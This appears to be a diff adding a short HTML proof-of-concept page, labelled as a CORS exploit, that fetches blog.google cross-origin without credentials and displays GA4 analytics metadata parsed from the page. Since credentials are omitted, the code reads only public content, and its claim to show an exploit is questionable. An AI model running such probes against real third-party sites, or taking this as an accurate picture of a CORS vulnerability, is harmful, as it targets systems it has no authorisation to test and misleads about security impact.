@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>blog.google CORS PoC</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; }
+    pre { background: #f4f4f4; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
+  <h1>CORS Exploit PoC: blog.google</h1>
+  <p>This page fetches structured metadata from <code>https://blog.google</code> via cross-origin request and displays it below.</p>
+  <div id="output"><em>Loading...</em></div>
+
+  <script>
+    fetch("https://blog.google", {
+      method: "GET",
+      credentials: "omit"
+    })
+    .then(r => r.text())
+    .then(html => {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(html, "text/html");
+
+      const ga4 = [...doc.querySelectorAll("[data-ga4-analytics-lead-click], [data-ga4-analytics-eyebrow-click]")];
+      const extracted = ga4.map(el => {
+        try {
+          return JSON.parse(el.getAttribute("data-ga4-analytics-lead-click") || el.getAttribute("data-ga4-analytics-eyebrow-click"));
+        } catch {
+          return null;
+        }
+      }).filter(Boolean);
+
+      document.getElementById("output").innerHTML = "<pre>" + JSON.stringify(extracted, null, 2) + "</pre>";
+    })
+    .catch(err => {
+      document.getElementById("output").textContent = "Error: " + err;
+    });
+  </script>
+</body>
+</html>
